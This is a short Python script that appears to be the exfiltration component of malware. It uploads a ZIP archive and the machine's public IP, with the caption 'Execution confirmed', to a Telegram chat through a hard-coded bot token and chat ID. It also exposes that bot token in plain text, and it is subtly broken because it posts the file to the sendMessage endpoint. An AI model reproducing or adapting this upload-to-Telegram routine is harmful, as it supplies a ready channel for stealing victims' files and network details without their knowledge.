import requests
import sys
from datetime import datetime

def send_telegram_message_with_doc(token, chat_id, message, document_path):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    with open(document_path, 'rb') as file:
        files = {
            'document': file
        }
        data = {
            'chat_id': chat_id,
            'caption': message
        }
        response = requests.post(url, data=data, files=files)
        return response.json()

if __name__ == "__main__":
    bot_token = "6715587533:AAFAroET16pO4odIrm6EZK6R1kl9Vtu8ZNM"  
    chat_id = "-4186941317"      
    
    public_ip = sys.argv[1] if len(sys.argv) > 1 else "Unavailable"
    zip_file_path = sys.argv[2] if len(sys.argv) > 2 else None
    
    timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    custom_message = f"Execution confirmed at {timestamp}. \nPublic IP: {public_ip}"
    
    # telegram_result = send_telegram_message(bot_token, chat_id, custom_message)    
    
    if zip_file_path:
        result = send_telegram_message_with_doc(bot_token, chat_id, custom_message, zip_file_path)
    else:
        print("ZIP file path not provided.")
